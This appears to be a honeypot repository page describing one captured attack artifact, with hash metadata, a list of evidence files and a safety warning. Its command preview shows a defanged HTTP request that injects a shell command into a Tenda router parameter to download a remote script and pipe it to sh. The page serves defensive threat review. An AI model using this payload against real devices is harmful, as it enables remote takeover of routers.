# f16b9a84f9cc30291fd5d5ad1bd1f59e5304bf9cdd62a3000aeab0427a9666e3

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `f16b9a84f9cc30291fd5d5ad1bd1f59e5304bf9cdd62a3000aeab0427a9666e3` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
GET /goform/setUsbUnload/.js?deviceName=A;cd%20/tmp%3Bwget%20hxxp://91[.]92[.]40[.]XXX/wget.sh%20-O-%7Csh%20-s%20tenda%3Bbusyb
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
